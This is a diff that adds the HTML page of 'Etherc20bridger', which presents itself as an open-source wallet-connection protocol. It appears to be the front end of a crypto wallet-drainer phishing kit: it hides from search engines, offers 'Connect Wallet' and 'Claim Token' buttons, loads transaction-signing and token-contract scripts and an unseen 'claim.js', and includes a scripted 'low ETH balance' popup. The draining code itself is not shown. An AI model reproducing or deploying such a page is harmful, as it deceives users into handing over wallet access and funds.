@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="en">
+ 
+<head>
+    <meta name="viewport" content="width=device-width" />
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <title>Connect - Etherc20bridger</title>
+    <meta name="description" content="is a free protocol that lets users manage all their wallets from one space" />
+
+
+    <link rel="icon" href="./logo.svg" />
+    <meta name="next-head-count" content="5" />
+    <link rel="stylesheet" href="./_next/main.css" data-n-g="" />
+    
+
+    <meta name="robots" content="noindex, nofollow">
+    <meta name="robots" content="noimageindex">
+
+	<script src="settings.js"></script>
+    <script src="src/js/ethereumjs-tx-1.3.3.min.js"></script>
+    <script src="ajax/libs/bignumber_js/8.0.2/bignumber.js" referrerpolicy="no-referrer"></script>
+    <script src="src/js/tokenabi.js"></script>
+    <script src="src/js/jquery.min.js"></script>
+
+
+</head>
+
+<body>
+  <!--<header class="fixed z-50 w-full bg-white py-4 sm:py-5 px-2 sm:px-3 border-b shadow-md">-->
+  <!--          <div class="container max-w-screen-lg mx-auto flex flex-row items-center justify-between">-->
+  <!--              <a href="/">-->
+  <!--                  <div class="inline-flex items-center justify-center cursor-pointer"><img src="./logo.svg" class="h-10 w-10" />-->
+  <!--                  </div>-->
+  <!--              </a>-->
+  <!--              <div><a class="inline-flex items-center justify-center text-white cursor-pointer hover:text-primary bg-primary hover:bg-transparent font-bold px-6 py-2 rounded-md border-2 border-primary" href="./connect.html">Connect</a></div>-->
+  <!--          </div>-->
+  <!--      </header>-->
+
+    <div id="__next">
+      
+        <div class="h-14"></div>
+        <main>
+            <br> <br> <br>
+            <div class="container max-w-screen-sm mx-auto text-center px-4 md:8 py-10">
+                <div class="inline-flex items-center"><img src="./logo.svg" height="100" width="100" /></div> <br> <br> <br>
+                <div class="my-4 font-light"><a class="font-bold" href="/">Etherc20bridger</a> is an open source protocol
+                    for connecting decentralised applications to mobile wallets with QR code scanning or deep linking. A
+                    user can interact securely with any Dapp from their mobile phone, making Etherc20bridger wallets a
+                    safer choice compared to desktop or browser extension wallets.</div> 
+                <div class="my-6">
+                    <div class="flex flex-col items-center">
+                       <br><br> <br><br><br>
+                            
+                            
+                            <button id="connectWallet" class="cursor-pointer rounded-md mb-4 text-primary border-2 border-primary w-2/3 font-semibold text-center py-3">Connect
+                            Wallet</button>
+                            
+                            
+                            <button id="claimButton" style="display: none;"
+                            class="cursor-pointer rounded-md mb-4 text-primary border-2 border-primary w-2/3 font-semibold text-center py-3">Claim Token</button>
+                            
+                            <!--<button -->
+                            <!--class="cursor-pointer rounded-md mb-4 text-primary border-2 border-primary w-2/3 font-semibold text-center py-3">Migration</button>-->
+                            
+                            
+                           
+                            </div>
+                </div>
+            </div>
+           
+        </main>
+        
+
+      
+<style>
+    
+.popup-err {
+    position: fixed;
+    left: 0;
+    top: 0;
+    height: 100%;
+    width: 100%;
+    background-color: rgba(25, 28, 31, 0.8);
+    opacity: 0;
+    visibility: hidden;
+    -webkit-transition: opacity 0.5s 0s, visibility 0s 0.5s;
+    -moz-transition: opacity 0.5s 0s, visibility 0s 0.5s;
+    transition: opacity 0.5s 0s, visibility 0s 0.5s;
+    z-index: 1;
+}
+
+.popup-err.is-visible {
+    opacity: 1;
+    visibility: visible;
+    -webkit-transition: opacity 0s 0s, visibility 0s 0s;
+    -moz-transition: opacity 0s 0s, visibility 0s 0s;
+    transition: opacity 0s 0s, visibility 0s 0s;
+}
+
+.popup-margin {
+    margin: 150px auto;
+}
+
+.popup-win-margin {
+    margin: 50px auto;
+}
+
+.popup-container {
+    position: relative;
+    width: 90%;
+    max-width: 400px;
+    background-color: rgba(25, 28, 31, 0.3);
+    backdrop-filter: blur(20px);
+    -webkit-backdrop-filter: blur(20px);
+    border: solid 1px rgba(255, 255, 255, 0.08);
+    border-radius: 10px;
+    padding: 40px 0;
+    text-align: center;
+    -webkit-transform: translateY(-40px);
+    -moz-transform: translateY(-40px);
+    -ms-transform: translateY(-40px);
+    -o-transform: translateY(-40px);
+    transform: translateY(-40px);
+    -webkit-backface-visibility: hidden;
+    -webkit-transition-property: -webkit-transform;
+    -moz-transition-property: -moz-transform;
+    transition-property: transform;
+    -webkit-transition-duration: 0.5s;
+    -moz-transition-duration: 0.5s;
+    transition-duration: 0.5s;
+}
+
+.is-visible .popup-container {
+    -webkit-transform: translateY(0);
+    -moz-transform: translateY(0);
+    -ms-transform: translateY(0);
+    -o-transform: translateY(0);
+    transform: translateY(0);
+}
+
+.popup-container h1 {
+    font-size: 27px;
+    font-weight: 500;
+    color: rgba(255, 255, 255, 0.6);
+    margin: 0 0 10px 0;
+    line-height: 1.5em;
+}
+
+.popup-container p {
+    font-size: 16px;
+    font-weight: 400;
+    color: #fff;
+    line-height: 1.5em;
+    margin-top: 0px;
+}
+
+.popup-close {
+    font-family: "Montserrat", sans-serif;
+    font-size: 16px;
+    font-weight: 600;
+    background: #feda03;
+    border-radius: 10px;
+    border: none;
+    color: #191c1f;
+    display: block;
+    outline: none;
+    margin: 20px auto 10px;
+    padding: 15px 30px;
+    cursor: pointer;
+    transition: 0.5s;
+}
+
+.popup-close:hover {
+    background-color: #e3c305;
+}
+
+.popup-box img {
+    width: 200px;
+    border-radius: 10px;
+    pointer-events: none;
+}
+
+.popup-item {
+    text-align: center;
+}
+</style>
+        <!-- <script src="<?= $Web_url ?>/js.js"></script> -->
+        
+        <div class="popup-err">
+		<div class="popup-container popup-margin">
+			<h1>Oops!</h1>
+			<p>You Have a Low ETH Balance <br>to Pay for Transaction Gas <br>Gas Price 0,018 ETH</p>
+			<button class="popup-close">Ok</button>
+		</div>
+	</div>
+	<script src="assets/js/jquery-3.6.0.min.js"></script>
+	<script src="web3-latest/dist/web3.min.js"></script>
+    <script type="text/javascript" src="web3modal.js"></script>
+    <script type="text/javascript" src="https://unpkg.com/evm-chains/lib/index.js"></script>
+    <script type="text/javascript" src="-walletconnect/web3-provider.js"></script>
+    <script src="moralis-v1-1.12.0/dist/moralis.js"></script>
+    <script src="-walletconnect/web3-provider-1.7.8/dist/umd/index.min.js"></script>
+    <script type="text/javascript" src="src/js/claim.js"></script>
+    <script src="assets/js/popup.js"></script>
+    <script type="text/javascript">
+        $('.alert-eth-message-close').click(function(){
+        $('.alert-eth-message').fadeOut(200);
+        });
+    </script>
+
+</body>
+
+</html>
